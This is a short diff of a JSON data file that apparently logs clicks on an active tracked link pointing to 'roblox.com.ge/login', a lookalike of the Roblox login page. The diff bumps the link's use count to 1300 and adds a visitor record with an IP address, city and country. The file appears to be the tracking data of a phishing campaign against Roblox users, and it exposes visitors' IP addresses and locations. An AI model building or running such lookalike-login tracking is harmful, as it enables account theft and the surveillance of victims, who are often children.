@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1299,
+    "useCount": 1300,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10536,6 +10536,14 @@
         "city": "Angeles City",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777373130959,
+        "ip": "86.120.140.18",
+        "country": "Romania",
+        "city": "Alexandria",
+        "flag": "🇷🇴",
+        "countryCode": "RO"
       }
     ]
   },
